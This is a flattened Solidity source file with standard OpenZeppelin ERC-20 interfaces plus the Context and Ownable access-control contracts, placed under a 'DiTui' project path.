// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: contracts/DiTui/common/IERC20Metadata.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: contracts/DiTui/common/Context.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: contracts/DiTui/common/Ownable.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "./Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

